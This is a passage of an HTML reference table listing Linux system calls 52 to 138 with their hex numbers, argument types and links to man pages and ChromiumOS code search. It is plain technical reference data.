<td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td>
<td align="center">0x33</td>
<td>const char *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">52</td>
<td>umount2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td>
<td align="center">0x34</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">53</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x35</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">54</td>
<td>ioctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td>
<td align="center">0x36</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">55</td>
<td>fcntl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td>
<td align="center">0x37</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">56</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x38</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">57</td>
<td>setpgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td>
<td align="center">0x39</td>
<td>pid_t pid</td>
<td>pid_t pgid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">58</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x3a</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">59</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x3b</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">60</td>
<td>umask</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td>
<td align="center">0x3c</td>
<td>int mask</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">61</td>
<td>chroot</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td>
<td align="center">0x3d</td>
<td>const char *filename</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">62</td>
<td>ustat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ustat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ustat">cs/</a></td>
<td align="center">0x3e</td>
<td>unsigned dev</td>
<td>struct ustat *ubuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">63</td>
<td>dup2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup2">cs/</a></td>
<td align="center">0x3f</td>
<td>unsigned int oldfd</td>
<td>unsigned int newfd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">64</td>
<td>getppid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td>
<td align="center">0x40</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">65</td>
<td>getpgrp</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgrp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgrp">cs/</a></td>
<td align="center">0x41</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">66</td>
<td>setsid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td>
<td align="center">0x42</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">67</td>
<td>sigaction</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaction">cs/</a></td>
<td align="center">0x43</td>
<td>int</td>
<td>const struct old_sigaction *</td>
<td>struct old_sigaction *</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">68</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x44</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">69</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x45</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">70</td>
<td>setreuid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td>
<td align="center">0x46</td>
<td>uid_t ruid</td>
<td>uid_t euid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">71</td>
<td>setregid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td>
<td align="center">0x47</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">72</td>
<td>sigsuspend</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigsuspend">cs/</a></td>
<td align="center">0x48</td>
<td>int unused1</td>
<td>int unused2</td>
<td>old_sigset_t mask</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">73</td>
<td>sigpending</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigpending">cs/</a></td>
<td align="center">0x49</td>
<td>old_sigset_t *uset</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">74</td>
<td>sethostname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td>
<td align="center">0x4a</td>
<td>char *name</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">75</td>
<td>setrlimit</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td>
<td align="center">0x4b</td>
<td>unsigned int resource</td>
<td>struct rlimit *rlim</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">76</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x4c</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">77</td>
<td>getrusage</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td>
<td align="center">0x4d</td>
<td>int who</td>
<td>struct rusage *ru</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">78</td>
<td>gettimeofday</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td>
<td align="center">0x4e</td>
<td>struct __kernel_old_timeval *tv</td>
<td>struct timezone *tz</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">79</td>
<td>settimeofday</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td>
<td align="center">0x4f</td>
<td>struct __kernel_old_timeval *tv</td>
<td>struct timezone *tz</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">80</td>
<td>getgroups</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td>
<td align="center">0x50</td>
<td>int gidsetsize</td>
<td>gid_t *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">81</td>
<td>setgroups</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td>
<td align="center">0x51</td>
<td>int gidsetsize</td>
<td>gid_t *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">82</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x52</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">83</td>
<td>symlink</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/symlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlink">cs/</a></td>
<td align="center">0x53</td>
<td>const char *old</td>
<td>const char *new</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">84</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x54</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">85</td>
<td>readlink</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/readlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlink">cs/</a></td>
<td align="center">0x55</td>
<td>const char *path</td>
<td>char *buf</td>
<td>int bufsiz</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">86</td>
<td>uselib</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/uselib.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uselib">cs/</a></td>
<td align="center">0x56</td>
<td>const char *library</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">87</td>
<td>swapon</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td>
<td align="center">0x57</td>
<td>const char *specialfile</td>
<td>int swap_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">88</td>
<td>reboot</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td>
<td align="center">0x58</td>
<td>int magic1</td>
<td>int magic2</td>
<td>unsigned int cmd</td>
<td>void *arg</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">89</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x59</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">90</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x5a</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">91</td>
<td>munmap</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td>
<td align="center">0x5b</td>
<td>unsigned long addr</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">92</td>
<td>truncate</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td>
<td align="center">0x5c</td>
<td>const char *path</td>
<td>long length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">93</td>
<td>ftruncate</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td>
<td align="center">0x5d</td>
<td>unsigned int fd</td>
<td>unsigned long length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">94</td>
<td>fchmod</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td>
<td align="center">0x5e</td>
<td>unsigned int fd</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">95</td>
<td>fchown</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td>
<td align="center">0x5f</td>
<td>unsigned int fd</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">96</td>
<td>getpriority</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td>
<td align="center">0x60</td>
<td>int which</td>
<td>int who</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">97</td>
<td>setpriority</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td>
<td align="center">0x61</td>
<td>int which</td>
<td>int who</td>
<td>int niceval</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">98</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x62</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">99</td>
<td>statfs</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td>
<td align="center">0x63</td>
<td>const char * path</td>
<td>struct statfs *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">100</td>
<td>fstatfs</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td>
<td align="center">0x64</td>
<td>unsigned int fd</td>
<td>struct statfs *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">101</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x65</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">102</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x66</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">103</td>
<td>syslog</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td>
<td align="center">0x67</td>
<td>int type</td>
<td>char *buf</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">104</td>
<td>setitimer</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td>
<td align="center">0x68</td>
<td>int which</td>
<td>struct __kernel_old_itimerval *value</td>
<td>struct __kernel_old_itimerval *ovalue</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">105</td>
<td>getitimer</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td>
<td align="center">0x69</td>
<td>int which</td>
<td>struct __kernel_old_itimerval *value</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">106</td>
<td>stat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/stat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*stat">cs/</a></td>
<td align="center">0x6a</td>
<td>const char *filename</td>
<td>struct __old_kernel_stat *statbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">107</td>
<td>lstat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat">cs/</a></td>
<td align="center">0x6b</td>
<td>const char *filename</td>
<td>struct __old_kernel_stat *statbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">108</td>
<td>fstat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td>
<td align="center">0x6c</td>
<td>unsigned int fd</td>
<td>struct __old_kernel_stat *statbuf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">109</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x6d</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">110</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x6e</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">111</td>
<td>vhangup</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/vhangup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vhangup">cs/</a></td>
<td align="center">0x6f</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">112</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x70</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">113</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x71</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">114</td>
<td>wait4</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td>
<td align="center">0x72</td>
<td>pid_t pid</td>
<td>int *stat_addr</td>
<td>int options</td>
<td>struct rusage *ru</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">115</td>
<td>swapoff</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td>
<td align="center">0x73</td>
<td>const char *specialfile</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">116</td>
<td>sysinfo</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td>
<td align="center">0x74</td>
<td>struct sysinfo *info</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">117</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x75</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">118</td>
<td>fsync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td>
<td align="center">0x76</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">119</td>
<td>sigreturn</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigreturn">cs/</a></td>
<td align="center">0x77</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">120</td>
<td>clone</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td>
<td align="center">0x78</td>
<td>unsigned long</td>
<td>unsigned long</td>
<td>int *</td>
<td>int *</td>
<td>unsigned long</td>
<td>-</td>
</tr>
<tr>
<td align="center">121</td>
<td>setdomainname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td>
<td align="center">0x79</td>
<td>char *name</td>
<td>int len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">122</td>
<td>uname</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td>
<td align="center">0x7a</td>
<td>struct old_utsname *</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">123</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x7b</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">124</td>
<td>adjtimex</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td>
<td align="center">0x7c</td>
<td>struct __kernel_timex *txc_p</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">125</td>
<td>mprotect</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td>
<td align="center">0x7d</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned long prot</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">126</td>
<td>sigprocmask</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigprocmask">cs/</a></td>
<td align="center">0x7e</td>
<td>int how</td>
<td>old_sigset_t *set</td>
<td>old_sigset_t *oset</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">127</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x7f</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">128</td>
<td>init_module</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td>
<td align="center">0x80</td>
<td>void *umod</td>
<td>unsigned long len</td>
<td>const char *uargs</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">129</td>
<td>delete_module</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td>
<td align="center">0x81</td>
<td>const char *name_user</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">130</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x82</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">131</td>
<td>quotactl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td>
<td align="center">0x83</td>
<td>unsigned int cmd</td>
<td>const char *special</td>
<td>qid_t id</td>
<td>void *addr</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">132</td>
<td>getpgid</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td>
<td align="center">0x84</td>
<td>pid_t pid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">133</td>
<td>fchdir</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td>
<td align="center">0x85</td>
<td>unsigned int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">134</td>
<td>bdflush</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/bdflush.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bdflush">cs/</a></td>
<td align="center">0x86</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">135</td>
<td>sysfs</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sysfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysfs">cs/</a></td>
<td align="center">0x87</td>
<td>int option</td>
<td>unsigned long arg1</td>
<td>unsigned long arg2</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">136</td>
<td>personality</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td>
<td align="center">0x88</td>
<td>unsigned int personality</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">137</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x89</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">138</td>
<td>setfsuid</td>
